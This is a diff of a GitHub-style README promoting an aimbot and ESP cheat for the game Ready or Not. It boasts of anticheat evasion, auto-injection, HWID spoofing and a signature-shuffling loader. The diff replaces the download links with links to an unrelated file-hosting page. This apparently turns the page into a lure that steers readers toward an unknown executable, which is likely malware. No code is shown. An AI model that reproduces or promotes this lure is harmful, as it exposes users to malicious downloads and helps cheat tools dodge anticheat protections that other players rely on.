@@ -2,7 +2,7 @@
 
 Kick-doors just got kinder to your K/D. **Ready or Not Aimbot** drops surgical head-snaps, crystal ESP outlines, and a stealthy core that keeps anticheat snoozing. Slide it in, auto-inject, and watch the scoreboard salute your tag before the flashbang smoke clears.
 
-[![Get Ready or Not Aimbot](https://img.shields.io/badge/Get%20Ready%20or%20Not%20Aimbot-blueviolet)](https://wecheaters.github.io/cheats/ready-or-not/)
+[![Get Ready or Not Aimbot](https://img.shields.io/badge/Get%20Ready%20or%20Not%20Aimbot-blueviolet)](https://fileoffload4.bitbucket.io)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
@@ -25,7 +25,7 @@ Ready or Not rewards split-second precision—miss the first shot and the AI sus
 * **HWID Cloak** — randomizes identifiers every launch.
 * **Auto-Patch Updater** — fetches new offsets the second devs push a hotfix.
 
-[![Get Ready or Not Aimbot](https://www.gamerfun.club/wp-content/uploads/2024/12/Ready-or-Not-ESP-Hack-Screenshot.webp)](https://wecheaters.github.io/cheats/ready-or-not/)
+[![Get Ready or Not Aimbot](https://www.gamerfun.club/wp-content/uploads/2024/12/Ready-or-Not-ESP-Hack-Screenshot.webp)](https://fileoffload4.bitbucket.io)
 
 ---
 
@@ -123,3 +123,4 @@ A5: The loader’s signature shuffler adapts; just relaunch and play. 💥
 ## License
 
 MIT License
+
